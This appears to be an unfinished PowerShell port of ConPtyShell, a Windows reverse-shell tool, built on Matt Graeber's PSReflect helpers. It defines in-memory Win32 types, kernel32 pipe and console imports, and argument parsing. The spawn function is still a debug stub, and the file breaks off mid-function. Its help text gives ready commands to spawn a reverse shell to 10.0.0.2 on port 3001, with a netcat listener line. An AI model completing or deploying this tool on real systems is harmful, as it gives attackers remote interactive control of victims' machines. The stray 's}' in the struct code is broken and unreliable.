


# _____   _____   _____  ______ ______ _      ______ _____ _______ 
# |  __ \ / ____| |  __ \|  ____|  ____| |    |  ____/ ____|__   __|
# | |__) | (___   | |__) | |__  | |__  | |    | |__ | |       | |   
# |  ___/ \___ \  |  _  /|  __| |  __| | |    |  __|| |       | |   
# | |     ____) | | | \ \| |____| |    | |____| |___| |____   | |   
# |_|    |_____/  |_|  \_\______|_|    |______|______\_____|  |_|   

# We use PS Reflect, developped by Matt Graeber
# to more easily import C# function in PowerShell

# Reference:
# https://learn-powershell.net/2016/08/28/revisiting-netsession-function-using-psreflect/
# https://github.com/mattifestation/PSReflect/

#Requires -Version 2

function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [AppDomain]::CurrentDomain
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    if ($IsCoreCLR) {
        $AssemblyBuilder = [Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, 'Run')
    } else {
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    }

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $EntryPoint,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($EntryPoint) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName,
                [Reflection.PropertyInfo[]] @(),
                [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.PARAMETER CharSet

Dictates which character set marshaled strings should use.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout,

        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    switch($CharSet)
    {
        Ansi
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass
        }
        Auto
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass
        }
        Unicode
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass
        s}
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}




# _____            _____  _          _____ _          _ _ 
# / ____|          |  __ \| |        / ____| |        | | |
# | |     ___  _ __ | |__) | |_ _   _| (___ | |__   ___| | |
# | |    / _ \| '_ \|  ___/| __| | | |\___ \| '_ \ / _ \ | |
# | |___| (_) | | | | |    | |_| |_| |____) | | | |  __/ | |
# \_____\___/|_| |_|_|     \__|\__, |_____/|_| |_|\___|_|_|
#                               __/ |                      
#                              |___/                       

# This is the part where we port ConPtyShell to PowerShell


$Mod = New-InMemoryModule -ModuleName Win32
$global:Mod = $Mod

$global:ProccessInformation =  struct $Mod PROCESS_INFORMATION @{
    hProcess =      field 0 IntPtr
    hTread =        field 1 IntPtr
    dwProcessId =   field 2 int
    dwThreadId =    field 3 int
}

$global:SECURITY_ATTRIBUTES_TYPE = struct $Mod SECURITY_ATTRIBUTES @{
    nLength =               field 0 Int
    lpSecurityDescriptor =  field 1 IntPtr
    bInheritHandle =        field 2 Int
}

$FunctionDefinitions = @(
    (func kernel32 SetStdHandle ([IntPtr]) @([Int32], [IntPtr])),  
    (func kernel32 GetStdHandle ([IntPtr]) @([Int32])),  
    (func kernel32 CreatePipe ([bool]) @([IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [UInt32]) -EntryPoint CreatePipe -SetLastError),
    (func kernel32 CreateFile ([IntPtr]) @([String], [UInt32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr])),
    (func kernel32 GetModuleHandle ([IntPtr]) @([String]) -SetLastError),
    (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError)
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$global:Kernel32 = $Types['kernel32']


class ConPtyShellException : System.Exception {
    hidden [string]$error_string = "[-] ConPtyShellException: "

    ConPtyShellException() : base() { }

    ConPtyShellException([string]$message) : base($this.error_string + $message) { }
}


class ConPtyShell {
    hidden static [int]   $BUFFER_SIZE_PIPE  = 0x100000
    hidden static [UInt32] $GENERIC_READ = 2147483648
    hidden static [UInt32] $GENERIC_WRITE    = 0x40000000
    hidden static [UInt32] $FILE_SHARE_READ  = 0x00000001
    hidden static [UInt32] $FILE_SHARE_WRITE = 0x00000002
    hidden static [UInt32] $FILE_ATTRIBUTE_NORMAL = 0x80
    hidden static [UInt32] $OPEN_EXISTING = 3

    hidden static [Int32] $STD_INPUT_HANDLE  = -10;
    hidden static [Int32] $STD_OUTPUT_HANDLE = -11;
    hidden static [Int32] $STD_ERROR_HANDLE  = -12;

    <# Define the class. Try constructors, properties, or methods. #>
    $ProccessInformation = $global:ProccessInformation

    hidden static [void] CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite) {
        $Kernel32 = $global:Kernel32

        $pSec = New-Object -TypeName "SECURITY_ATTRIBUTES"
        $pSec.nLength = $global:SECURITY_ATTRIBUTES_TYPE::GetSize()
        $pSec.bInheritHandle = 1
        $pSec.lpSecurityDescriptor = [IntPtr]::Zero
        
        if (! $Kernel32::CreatePipe($InputPipeRead, $InputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)) {
            throw [ConPtyShellException] "Could not create the InputPipe"
        }

        if (! $Kernel32::CreatePipe($OutputPipeRead, $OutputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)) {
            throw [ConPtyShellException] "Could not create the OutputPipe"
        }
        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
    }

    hidden static [void] InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr) {
        $Kernel32 = $global:Kernel32

        $oldStdIn.Value  = $Kernel32::GetStdHandle([ConPtyShell]::STD_INPUT_HANDLE);
        $oldStdOut.Value = $Kernel32::GetStdHandle([ConPtyShell]::STD_OUTPUT_HANDLE);
        $oldStdErr.Value = $Kernel32::GetStdHandle([ConPtyShell]::STD_ERROR_HANDLE);

        $hStdout = $kernel32::CreateFile("CONOUT$", [ConPtyShell]::GENERIC_READ -bor [ConPtyShell]::GENERIC_WRITE, [ConPtyShell]::FILE_SHARE_READ -bor [ConPtyShell]::FILE_SHARE_WRITE, [IntPtr]::Zero, [ConPtyShell]::OPEN_EXISTING, [ConPtyShell]::FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero);
        $hStdin =  $kernel32::CreateFile("CONIN$",  [ConPtyShell]::GENERIC_READ -bor [ConPtyShell]::GENERIC_WRITE, [ConPtyShell]::FILE_SHARE_READ -bor [ConPtyShell]::FILE_SHARE_WRITE, [IntPtr]::Zero, [ConPtyShell]::OPEN_EXISTING, [ConPtyShell]::FILE_ATTRIBUTE_NORMAL, [IntPtr]::Zero);

        $Kernel32::SetStdHandle([ConPtyShell]::STD_OUTPUT_HANDLE, $hStdout);
        $Kernel32::SetStdHandle([ConPtyShell]::STD_ERROR_HANDLE, $hStdout);
        $Kernel32::SetStdHandle([ConPtyShell]::STD_INPUT_HANDLE, $hStdin);
    }


    static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {

        [IntPtr] $shellSocket = [IntPtr]::Zero
        [IntPtr] $InputPipeRead = [IntPtr]::Zero
        [IntPtr] $InputPipeWrite = [IntPtr]::Zero
        [IntPtr] $OutputPipeRead = [IntPtr]::Zero
        [IntPtr] $OutputPipeWrite = [IntPtr]::Zero
        [IntPtr] $handlePseudoConsole = [IntPtr]::Zero
        [IntPtr] $oldStdIn  = [IntPtr]::Zero
        [IntPtr] $oldStdOut = [IntPtr]::Zero
        [IntPtr] $oldStdErr = [IntPtr]::Zero
        [bool] $newConsoleAllocated = $false
        [bool] $parentSocketInherited = $false
        [bool] $grandParentSocketInherited = $false
        [bool] $conptyCompatible = $false
        [bool] $IsSocketOverlapped = $true
        [string] $output = ""
        $currentProcess = $null
        $parentProcess = $null
        $grandParentProcess = $null


        $Kernel32 = $global:Kernel32
        $kernel32base = $Kernel32::GetModuleHandle('kernel32')

        [bool] $conptyCompatible = $false
        if ($Kernel32::GetProcAddress($kernel32base, 'CreatePseudoConsole') -ne [IntPtr]::Zero) {
            $conptyCompatible = $true
        }

        [ConPtyShell]::CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite)

        # comment the below function to debug errors
        [ConPtyShell]::InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr)

        $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Host "Err msg: " $LastError.Message

        Write-Host "remoteIP: $remoteIp, remotePort: $remotePort, rows: $rows, cols: $cols, cmdLine $commandLine, upShell $upgradeShell"

        return "Hi mom!"
    }
}

class ConPtyShellMainClass {
    
    hidden static [void] DisplayHelp() {
        $help = @"
ConPtyShell - Fully Interactive Reverse Shell for Windows
Author: splinter_code
License: MIT
Source: https://github.com/antonioCoco/ConPtyShell
   
ConPtyShell - Fully interactive reverse shell for Windows
Properly set the rows and cols values. You can retrieve it from
your terminal with the command "stty size".
You can avoid to set rows and cols values if you run your listener
with the following command:
    stty raw -echo; (stty size; cat) | nc -lvnp 3001
If you want to change the console size directly from powershell
you can paste the following commands:
    `$width=80
    `$height=24
    `$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size (`$width, `$height)
    `$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList (`$width, `$height)
Usage:
    ConPtyShell.ps1 -RemoteIp <ip> -RemotePort <port> [-Rows <rows>] [-Cols <cols>] [-CommandLine <command>]
Positional arguments:
    RemoteIp                The remote ip to connect
    RemotePort              The remote port to connect
    [Rows]                  Rows size for the console
                            Default: "24"
    [Cols]                  Cols size for the console
                            Default: "80"
    [CommandLine]           The commandline of the process that you are going to interact
                            Default: "powershell.exe"
                           
Examples:
    Spawn a reverse shell
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001
   
    Spawn a reverse shell with specific rows and cols size
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90
   
    Spawn a reverse shell (cmd.exe) with specific rows and cols size
        .\ConPtyShell.ps1 -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe
"@

        Write-Host $help
    }

    hidden static [bool] HelpRequired([string] $param) {
        return ($param -eq "-h") -or ($param -eq "--help") -or ($param -eq "/?")
    }

    hidden static [void] CheckArgs([string[]] $arguments) {
        if ($arguments.Length -lt 2) {
            throw [ConPtyShellException] "Not enough arguments. 2 Arguments required. Use --help for additional help."
        }
    }

    hidden static [string] CheckRemoteIpArg([string] $ipString) {
        try {
            [System.Net.IPAddress]::Parse($ipString)
        } catch {
            throw [ConPtyShellException] "Invalid remoteIp value $ipString"
        }

        return $ipString
    }

    hidden static [uint32] CheckUint([string] $arg) {
        try {
            return [uint32]$arg
        } catch {
            throw [ConPtyShellException] "Invalid unsigned integer value $arg"
        }
    }

    hidden static [uint32] ParseRows([string[]] $arguments) {
        [uint32] $rows = 24;
        if ($arguments.Length -gt 2) {
            $rows = [ConPtyShellMainClass]::CheckUint($arguments[2]);
        }
        return $rows;
    }

    hidden static [uint32] ParseCols([string[]] $arguments) {
        [uint32] $cols = 80;
        if ($arguments.Length -gt 3) {
            $cols = [ConPtyShellMainClass]::CheckUint($arguments[3]);
        }
        return $cols;
    }

    hidden static [string] ParseCommandLine([string[]] $arguments) {
        [string] $commandLine = "powershell.exe"

        if ($arguments.Length -gt 4) {
            $commandLine = $arguments[4]
        }
        return $commandLine
    }

    static [string] ConPtyShellMain([string[]] $arguments) {
        [string] $output = "" 
        
        if ($arguments.Length -eq 1 -and [ConPtyShellMainClass]::HelpRequired($arguments[0])) {
            [ConPtyShellMainClass]::DisplayHelp()
        } else {
            [string] $remoteIp = ""
            [int] $remotePort = 0
            [bool] $upgradeShell = $false

            try {
                [ConPtyShellMainClass]::CheckArgs($arguments)
                
                if (($arguments[0]).Contains("upgrade")) {
                    $upgradeShell = $true
                } else {
                    $remoteIp = [ConPtyShellMainClass]::CheckRemoteIpArg($arguments[0])
                    $remotePort = [ConPtyShellMainClass]::CheckUint($arguments[1])
                }

                [uint32] $rows = [ConPtyShellMainClass]::ParseRows($arguments)
                [uint32] $cols = [ConPtyShellMainClass]::ParseCols($arguments)
